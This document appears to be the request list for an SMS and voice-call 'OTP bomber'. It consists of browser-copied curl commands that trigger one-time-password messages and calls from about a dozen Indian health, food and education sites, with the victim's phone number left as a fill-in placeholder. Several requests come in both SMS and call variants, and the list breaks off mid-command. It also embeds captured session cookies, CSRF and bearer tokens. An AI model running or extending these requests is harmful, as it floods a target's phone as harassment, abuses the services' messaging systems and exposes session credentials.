curl 'https://webapi.apollo247.com/' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -H 'Origin: https://www.apollopharmacy.in' \
  -H 'Referer: https://www.apollopharmacy.in/' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: cross-site' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'accept: */*' \
  -H 'authorization: Bearer 3d1833da7020e0602165529446587434' \
  -H 'content-type: application/json' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw $'{"operationName":"Login","variables":{"mobileNumber":"+91€tor","loginType":"PATIENT"},"query":"query Login($mobileNumber: String\u0021, $loginType: LOGIN_TYPE\u0021) {\\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\\n    status\\n    message\\n    loginId\\n    __typename\\n  }\\n}\\n"}' \
  --compressed



curl 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
  -H 'authority: unacademy.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'cookie: isDarkModeOn=; proxy-user-uid=856546e5_d94d_4c92_b2ea_50601b466977; un_session_id=738747f0_073b_4eb6_b3b7_5f1fbb258522; ajs_anonymous_id=29f31176_c196_4600_86e7_6b6880e7ea35; anonymous_session_id=aeaeefcf_bd1f_46e6_848d_0eea5f87a8f8; _gcl_au=1.1.721686470.1676749491; __gtm_referrer=https%3A%2F%2Fwww.google.com%2F; _gid=GA1.2.1865436011.1676749491; _gat_UA-69016858-2=1; _gat_UA-5306665-19=1; _ga=GA1.2.387904297.1676749491; _fbp=fb.1.1676749491677.513529990; _ga_6JX23YC5TQ=GS1.1.1676749491.1.0.1676749493.0.0.0; ajs_anonymous_id=29f31176_c196_4600_86e7_6b6880e7ea35; _uetsid=b7bec9f0afc411edb8fcf3e5b0242a00; _uetvid=bd557650d54211ecab6383e5aece31d2' \
  -H 'origin: https://unacademy.com' \
  -H 'referer: https://unacademy.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'x-platform: 0' \
  --data-raw '{"phone":"€tor","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}' \
  --compressed


curl 'https://www.1mg.com/auth_api/v6/create_token' \
  -H 'authority: www.1mg.com' \
  -H 'accept: application/vnd.healthkartplus.v11+json' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cache-control: no-cache, no-store, must-revalidate' \
  -H 'content-type: application/json' \
  -H 'cookie: VISITOR-ID=c99c0c9d-83d5-4278-c213-643112598a91_acce55_1676729979; city=New%20Delhi; abVisitorId=939604; abExperimentShow=false; amoSessionId=34b0afff-b37b-4a23-bedc-b7c34f31585b; _csrf=AKH-us7dH8ukhnXxYddFxMWZ; isLocaleRedirect=false; isLocaleUIChange=false; _fbp=fb.1.1676729831196.2102042321; geolocation=false; session=r0At4uZPUY5KBP9z6oUE9g.HA9GWOAOjYmT0cW7sZaXEhSjNTb1lL41XKlBCewyOKRWlQySDPiHyAaeLFnMlcJZCdD6SoOU26xSUa2_2uTEfm__O-pT2Uii7ZM42LKWHWrdxvhKnd6MThYVg_8l0KvAykGQAwYt975e5Vk0WSIimg.1676729982547.144000000.0adMxuts723a2dhqUDZGfsJ-8K_iEXc6JT3KW1RxMG4; rl_group_id=RudderEncrypt%3AU2FsdGVkX1%2FStNdMwED%2BTTV06nDuNVSN5D9n4kk1GEM%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX19IBDFLZ9nEAjLNyMBHx%2FyetdQqTST8GcM%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2FL%2FJFdNiK5YUutpw0MxOKaIDO1h97n7zk1V%2FJNVf2t8k44kCyEiFov02inrpzQjyeFDbO1VI1scA%3D%3D; rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX1%2BfrS%2F1Yq%2BZHCBtJvR9sz4E7nyrWmSfPDKXHrPGCDl%2B9vZI9xcd6FZe; rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX18x3ztMsZrphb9%2FGq7adtf3%2BnqRhFkOY%2B5aDvSOGj81z4G5WiZXOxCx; rl_user_id=RudderEncrypt%3AU2FsdGVkX19tl15uVdl2F4HTtLqxkVYX5vVc13JJMRGsvBoqQDncUbQDp4lImDK6ng36A0qEasZXD4fsG1roJBtF%2Bu97PxBaE2eHI2hdoGA%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX188%2BNRgVCrrioB2gso0chWwimiNCqv0acq9ZLzFkz2xRjIHAUruKYqloccZeJCOBlY04Fy1p8V9Iw%3D%3D; _uetsid=ef875af0af9611edbd12a720bc1ea225; _uetvid=ef87d4f0af9611ed995c477ccb56e9bb; _gcl_au=1.1.929593392.1676729832; _nv_sess=173339004.1676729983.9qooi8THZDgNOGZnK3IPdwynyi1Mm4kQtfLfQ3S4Xcg7kv8fpE; _nv_uid=173339004.1676729983.3ffe3c1c-7be0-41ad-855d-54d9c1821d4b.1676729983.1676729983.1.0; _nv_utm=173339004.1676729983.1.1.dXRtc3JjPWdvb2dsZXx1dG1jY249KG5vdCBzZXQpfHV0bWNtZD1vcmdhbmljfHV0bWN0cj0obm90IHByb3ZpZGVkKXx1dG1jY3Q9KG5vdCBzZXQpfGdjbGlkPShub3Qgc2V0KQ==; _nv_did=173339004.1676729983.10318094147tavoi; _ga_1HF6RR2VT7=GS1.1.1676729832.1.0.1676729832.0.0.0; _ga_NPGHGVF7FB=GS1.1.1676729832.1.0.1676729832.0.0.0; singular_device_id=523e24ec-85ce-4cc5-8a1d-f053dc51eb6a; AMP_TOKEN=%24NOT_FOUND; _ga=GA1.2.890613511.1676729832; _gid=GA1.2.976323208.1676729833; _dc_gtm_UA-21820217-6=1; _gat_UA-21820217-6=1; outbrain_cid_fetch=true; shw_13453=1; _nv_banner_x=13453; _nv_hit=173339004.1676729983.cHZpZXc9MXxidmlldz1bIjEzNDUzIl0=; rl_session=RudderEncrypt%3AU2FsdGVkX1%2FVC3m%2FmoqzX17bt9B%2Fc0bmbo82X7X5Lc%2Bfb%2BjGRJRrdFf7OF6hkZaU%2FE60GEATjhBeZclfs9LQKGHWIgdNiociVoDP1l7dHwb%2BTe7rpO3FrGk%2B6oWN%2BVoHXxRxm1%2BNzUWiFi3zOpPG9Q%3D%3D; AWSALBTG=Z/Cvr1JO8zVmPLKL6jkvDltFGYqygKonwBiXLDFNhqiFK9jbIemlamkXahjAVa1rVSiiysuuSUTwetABAhdN8H8kLRWKwce24pTdK8dMNeeY7Q7T0S+4UzPXEG+wDI47guvLcrpYn2KDySepzaAwKq/3/kKIn9q+A3oP3j1LA1fT; AWSALBTGCORS=Z/Cvr1JO8zVmPLKL6jkvDltFGYqygKonwBiXLDFNhqiFK9jbIemlamkXahjAVa1rVSiiysuuSUTwetABAhdN8H8kLRWKwce24pTdK8dMNeeY7Q7T0S+4UzPXEG+wDI47guvLcrpYn2KDySepzaAwKq/3/kKIn9q+A3oP3j1LA1fT' \
  -H 'hkp-platform: Healthkartplus-0.0.1-Desktop' \
  -H 'origin: https://www.1mg.com' \
  -H 'pragma: no-cache' \
  -H 'referer: https://www.1mg.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'visitor-id: c99c0c9d-83d5-4278-c213-643112598a91_acce55_1676729979' \
  -H 'x-csrf-token: qsV9AIy4-C0GI9ppMcea042GtPQ8WRA6AhlE' \
  -H 'x-html-canrender: True' \
  -H 'x-platform: Desktop-0.0.1' \
  --data-raw '{"number":"€tor","is_corporate_user":false,"is_doctor":false}' \
  --compressed


curl 'https://api.testbook.com/api/v2/otp/send?emailOrMobile=€tor&resend=true' \
  -H 'authority: api.testbook.com' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'origin: https://testbook.com' \
  -H 'referer: https://testbook.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'sec-ch-ua-platform: "Android"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 Edg/110.0.1587.57' \
  -H 'x-tb-client: web,1.2' \
  --data-raw '{}' \
  --compressed

curl 'https://api.tendercuts.in/otp/v2/generate/' \
  -H 'authority: api.tendercuts.in' \
  -H 'accept: application/json' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'origin: https://www.tendercuts.in' \
  -H 'referer: https://www.tendercuts.in/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"mobile":"€tor","otp_mode":"SIGNUP"}' \
  --compressed




#ll..



curl 'https://api.tendercuts.in/otp/retry/' \
  -H 'authority: api.tendercuts.in' \
  -H 'accept: application/json' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'origin: https://www.tendercuts.in' \
  -H 'referer: https://www.tendercuts.in/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"mobile":"€tor","retry_mode":"voice","gateway":null}' \
  --compressed

curl 'https://www.1mg.com/auth_api/v6/create_token' \
  -H 'authority: www.1mg.com' \
  -H 'accept: application/vnd.healthkartplus.v11+json' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cache-control: no-cache, no-store, must-revalidate' \
  -H 'content-type: application/json' \
  -H 'cookie: VISITOR-ID=c99c0c9d-83d5-4278-c213-643112598a91_acce55_1676729979; city=New%20Delhi; abVisitorId=939604; abExperimentShow=false; amoSessionId=34b0afff-b37b-4a23-bedc-b7c34f31585b; _csrf=AKH-us7dH8ukhnXxYddFxMWZ; isLocaleRedirect=false; isLocaleUIChange=false; _fbp=fb.1.1676729831196.2102042321; geolocation=false; session=r0At4uZPUY5KBP9z6oUE9g.HA9GWOAOjYmT0cW7sZaXEhSjNTb1lL41XKlBCewyOKRWlQySDPiHyAaeLFnMlcJZCdD6SoOU26xSUa2_2uTEfm__O-pT2Uii7ZM42LKWHWrdxvhKnd6MThYVg_8l0KvAykGQAwYt975e5Vk0WSIimg.1676729982547.144000000.0adMxuts723a2dhqUDZGfsJ-8K_iEXc6JT3KW1RxMG4; rl_group_id=RudderEncrypt%3AU2FsdGVkX1%2FStNdMwED%2BTTV06nDuNVSN5D9n4kk1GEM%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX19IBDFLZ9nEAjLNyMBHx%2FyetdQqTST8GcM%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2FL%2FJFdNiK5YUutpw0MxOKaIDO1h97n7zk1V%2FJNVf2t8k44kCyEiFov02inrpzQjyeFDbO1VI1scA%3D%3D; rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX1%2BfrS%2F1Yq%2BZHCBtJvR9sz4E7nyrWmSfPDKXHrPGCDl%2B9vZI9xcd6FZe; rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX18x3ztMsZrphb9%2FGq7adtf3%2BnqRhFkOY%2B5aDvSOGj81z4G5WiZXOxCx; rl_user_id=RudderEncrypt%3AU2FsdGVkX19tl15uVdl2F4HTtLqxkVYX5vVc13JJMRGsvBoqQDncUbQDp4lImDK6ng36A0qEasZXD4fsG1roJBtF%2Bu97PxBaE2eHI2hdoGA%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX188%2BNRgVCrrioB2gso0chWwimiNCqv0acq9ZLzFkz2xRjIHAUruKYqloccZeJCOBlY04Fy1p8V9Iw%3D%3D; _uetsid=ef875af0af9611edbd12a720bc1ea225; _uetvid=ef87d4f0af9611ed995c477ccb56e9bb; _gcl_au=1.1.929593392.1676729832; _nv_sess=173339004.1676729983.9qooi8THZDgNOGZnK3IPdwynyi1Mm4kQtfLfQ3S4Xcg7kv8fpE; _nv_uid=173339004.1676729983.3ffe3c1c-7be0-41ad-855d-54d9c1821d4b.1676729983.1676729983.1.0; _nv_utm=173339004.1676729983.1.1.dXRtc3JjPWdvb2dsZXx1dG1jY249KG5vdCBzZXQpfHV0bWNtZD1vcmdhbmljfHV0bWN0cj0obm90IHByb3ZpZGVkKXx1dG1jY3Q9KG5vdCBzZXQpfGdjbGlkPShub3Qgc2V0KQ==; _nv_did=173339004.1676729983.10318094147tavoi; _ga_1HF6RR2VT7=GS1.1.1676729832.1.0.1676729832.0.0.0; _ga_NPGHGVF7FB=GS1.1.1676729832.1.0.1676729832.0.0.0; singular_device_id=523e24ec-85ce-4cc5-8a1d-f053dc51eb6a; AMP_TOKEN=%24NOT_FOUND; _ga=GA1.2.890613511.1676729832; _gid=GA1.2.976323208.1676729833; outbrain_cid_fetch=true; shw_13453=1; _nv_banner_x=13453; _nv_hit=173339004.1676729983.cHZpZXc9MXxidmlldz1bIjEzNDUzIl0=; AWSALBTG=DfsUbEZSlDPrsDYNT67nas897cRWx5/OVAOTdbqmdkLZtCY+2LbrDf+NEyc+CLy89gFBr5xJEfeTgAfBh75i2d8Z5RkUlEqkahbKSXC3qZzMQ+G7Npnww1qSvvMCuQKEwoUzdnXjRw+Ve4v/Js3XhY+S5a9BRyxYwfM6k965C5gJ; AWSALBTGCORS=DfsUbEZSlDPrsDYNT67nas897cRWx5/OVAOTdbqmdkLZtCY+2LbrDf+NEyc+CLy89gFBr5xJEfeTgAfBh75i2d8Z5RkUlEqkahbKSXC3qZzMQ+G7Npnww1qSvvMCuQKEwoUzdnXjRw+Ve4v/Js3XhY+S5a9BRyxYwfM6k965C5gJ; rl_session=RudderEncrypt%3AU2FsdGVkX19k1sKjNkmJ0%2BE2UJNIxhxyg8AG53dzSaIKZi0oI2Gl6DNxg66M5CAzF6LA1o3FmnDKyNgn5AwoTJVjE%2FTWnmtLhtj0Ysr2z%2B%2Bsf%2FSbHvSYHd3VJevNHij9AuM4Slxl388yg2%2BHHb82VA%3D%3D' \
  -H 'hkp-platform: Healthkartplus-0.0.1-Desktop' \
  -H 'origin: https://www.1mg.com' \
  -H 'pragma: no-cache' \
  -H 'referer: https://www.1mg.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'visitor-id: c99c0c9d-83d5-4278-c213-643112598a91_acce55_1676729979' \
  -H 'x-csrf-token: qsV9AIy4-C0GI9ppMcea042GtPQ8WRA6AhlE' \
  -H 'x-html-canrender: True' \
  -H 'x-platform: Desktop-0.0.1' \
  --data-raw '{"number":"€tor","is_corporate_user":false,"otp_on_call":true}' \
  --compressed


curl 'https://api.testbook.com/api/v2/otp/send?emailOrMobile=€tor&otpSentVia=call&resend=true' \
  -H 'authority: api.testbook.com' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'origin: https://testbook.com' \
  -H 'referer: https://testbook.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'sec-ch-ua-platform: "Android"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 Edg/110.0.1587.57' \
  -H 'x-tb-client: web,1.2' \
  --data-raw '{}' \
  --compressed

curl 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
  -H 'authority: unacademy.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'cookie: isDarkModeOn=; proxy-user-uid=856546e5_d94d_4c92_b2ea_50601b466977; un_session_id=738747f0_073b_4eb6_b3b7_5f1fbb258522; ajs_anonymous_id=29f31176_c196_4600_86e7_6b6880e7ea35; anonymous_session_id=aeaeefcf_bd1f_46e6_848d_0eea5f87a8f8; _gcl_au=1.1.721686470.1676749491; __gtm_referrer=https%3A%2F%2Fwww.google.com%2F; _gid=GA1.2.1865436011.1676749491; _ga=GA1.2.387904297.1676749491; _fbp=fb.1.1676749491677.513529990; ajs_anonymous_id=29f31176_c196_4600_86e7_6b6880e7ea35; _ga_6JX23YC5TQ=GS1.1.1676749491.1.1.1676749507.0.0.0; _uetsid=b7bec9f0afc411edb8fcf3e5b0242a00; _uetvid=bd557650d54211ecab6383e5aece31d2' \
  -H 'origin: https://unacademy.com' \
  -H 'referer: https://unacademy.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'x-platform: 0' \
  --data-raw '{"phone":"€tor","country_code":"IN","otp_type":2,"email":"","send_otp":true,"is_un_teach_user":false}' \
  --compressed

curl 'https://webapi.apollo247.com/' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -H 'Origin: https://www.apollopharmacy.in' \
  -H 'Referer: https://www.apollopharmacy.in/' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: cross-site' \
  -H 'accept: */*' \
  -H 'authorization: Bearer 3d1833da7020e0602165529446587434' \
  -H 'content-type: application/json' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw $'{"operationName":"getOTPOnCall","variables":{"mobileNumber":"+91€tor","loginType":"PATIENT","id":"0c3f4d50-b054-11ed-9846-7b73ab120606"},"query":"query getOTPOnCall($mobileNumber: String, $loginType: LOGIN_TYPE, $id: String\u0021) {\\n  getOTPOnCall(mobileNumber: $mobileNumber, loginType: $loginType, id: $id) {\\n    status\\n    loginId\\n    message\\n    __typename\\n  }\\n}\\n"}' \
  --compressed


#..
curl 'https://eatiko.com/public/api/custom-otp-user' \
  -H 'authority: eatiko.com' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json;charset=UTF-8' \
  -H 'cookie: _ga=GA1.2.1203513973.1677318910; _gid=GA1.2.567870592.1677318910; _gat=1' \
  -H 'origin: https://eatiko.com' \
  -H 'referer: https://eatiko.com/login' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"phone":"+91€tor"}' \
  --compressed


curl 'https://www.healthians.com/login' \
  -H 'authority: www.healthians.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'cookie: guid=3DF08F50-C617-4755-88D8-B589DDA199E7; sLocation=Gurgaon; sLocationID=23; htnew=true; _gcl_au=1.1.968808006.1676811235; _gid=GA1.2.1639796330.1676811235; is_visited=true; _fbp=fb.1.1676811236748.790249500; exit_popoup=true; mousestats_vi=445b8f5a150de45f4a08; mousestats_si=db12ab1e48b20d228245; __zlcmid=1EVlc7TG8PpgsQ7; _ga=GA1.1.1935211854.1676811235; XSRF-TOKEN=eyJpdiI6InFXXC9MQ3BkRkU4M3hkbDBNdWRYKzJBPT0iLCJ2YWx1ZSI6IktOeFNmeThlbUxQenVEYkpQdWpOVElPMUJva21NbjZwRE1zaWNNNTJZek5vVmtGbXlDcGtnclBQWHh6SmJuSkUiLCJtYWMiOiJhMTM1MzI1MTA0NGU0OTU4MTY0NjZiZjk3NTkwMTFiNDdlZjdjMDFkOTdkNmYyZWRmYzViNDMzNWJiYmU1YTkzIn0%3D; laravel_healthians_session=eyJpdiI6IkFzeVNBNVUwbVZ1bDA3eFZDZFlHWEE9PSIsInZhbHVlIjoiR1ZZVHVRXC9QdjhrUkpZQ25sb1M1bWJzckdcL1dGQ2wxN2cySkdqREZ0bVJUSGU1V1hKR1QwV0VVbDlIWnFyVEgrcXdUaVc0YXl0dDdYS0xiTVQ0Ykx2ZUIzQ3JDS3E3SThQd0drcmJSZVwvaHhhRWlZVUowWVl2S1dvQVh5MGVEODAiLCJtYWMiOiJkNTI3MjUyNWU4Y2NiYmJhODYxZWZkYTAwZjIxYzNkZGFkN2ExNGI4YTcyNTlkY2QzNjZhODNlNzUwZTU2MTkxIn0%3D; _ga_CED4JZF07Z=GS1.1.1676811236.1.1.1676811263.0.0.0' \
  -H 'newrelic: eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM1OTk4MDMiLCJhcCI6IjEzODYwMjc0MTgiLCJpZCI6IjkxMTI4NDQ2NzhhZjQwYWEiLCJ0ciI6IjhjMmI4NDkxYmZmZjAxZmVmZWM5NjE3YTEyODBiYTAwIiwidGkiOjE2NzY4MTEzMjk0OTZ9fQ==' \
  -H 'origin: https://www.healthians.com' \
  -H 'referer: https://www.healthians.com/otp' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'traceparent: 00-8c2b8491bfff01fefec9617a1280ba00-9112844678af40aa-01' \
  -H 'tracestate: 3599803@nr=0-1-3599803-1386027418-9112844678af40aa----1676811329496' \
  -H 'x-newrelic-id: VwMOWF5TCxABVllbAwMHV10F' \
  -H 'x-requested-with: XMLHttpRequest' \
  --data-raw 'mobile_number=€tor&template=login&countryCode=91&resend=true&_token=v8k2Nn3DnUuBgsjT1aJUWTDjVBlRKALTkD5K6vEs' \
  --compressed

curl 'https://api.penpencil.co/v1/users/resend-otp?smsType=1' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'client-version: 1819' \
  -H 'Authorization: Bearer' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Referer: https://www.pw.live/' \
  -H 'randomId: 9242fe67-d24e-4fb1-8859-3d726e2471e3' \
  -H 'client-id: 5eb393ee95fab7468a79d189' \
  -H 'Client-Type: WEB' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw '{"mobile":"€tor","organizationId":"5eb393ee95fab7468a79d189"}' \
  --compressed

curl 'https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone' \
  -H 'authority: prod-auth-api.upgrad.com' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json;charset=UTF-8' \
  -H 'course;' \
  -H 'origin: https://www.upgrad.com' \
  -H 'referer: https://www.upgrad.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'utm_campaign;' \
  -H 'utm_content;' \
  -H 'utm_medium;' \
  -H 'utm_source;' \
  -H 'utm_term;' \
  --data-raw '{"phoneNumber":"+91€tor"}' \
  --compressed

curl 'https://user.vedantu.com/user/preLoginVerification' \
  -H 'authority: user.vedantu.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'cookie: LAST_SOURCE_UTMS={"utm_campaign":null,"utm_source":"google","utm_medium":"organic","utm_term":null,"utm_content":null}; FIRST_SOURCE_UTMS={"utm_campaign":null,"utm_source":"google","utm_medium":"organic","utm_term":null,"utm_content":null}; _gcl_au=1.1.1801421064.1676750632; _fbp=fb.1.1676750632305.1786532008; _uetsid=5dd410e0afc711ed929ef378d04704a5; _uetvid=5dd46fc0afc711eda0a1b549c8b1edc2; amp_832ba5=URKj3Eld2ax5kQvoBaAYiX...1gpj20d24.1gpj20ebf.3.0.3; _ga_35N6JBZRVC=GS1.1.1676750632.1.0.1676750633.59.0.0; _ga=GA1.2.569150463.1676750633; _gid=GA1.2.1152042693.1676750634; amp_832ba5_vedantu.com=URKj3Eld2ax5kQvoBaAYiX...1gpj20d24.1gpj20ggs.4.0.4; auth-token=8Hq63zA7QQVD8MmU' \
  -H 'origin: https://www.vedantu.com' \
  -H 'referer: https://www.vedantu.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"email":null,"phoneCode":"+91","phoneNumber":"€tor","version":2,"ver":"12.336"}' \
  --compressed

curl 'https://api.doubtnut.com/v4/student/login' \
  -H 'authority: api.doubtnut.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H 'origin: https://www.doubtnut.com' \
  -H 'referer: https://www.doubtnut.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
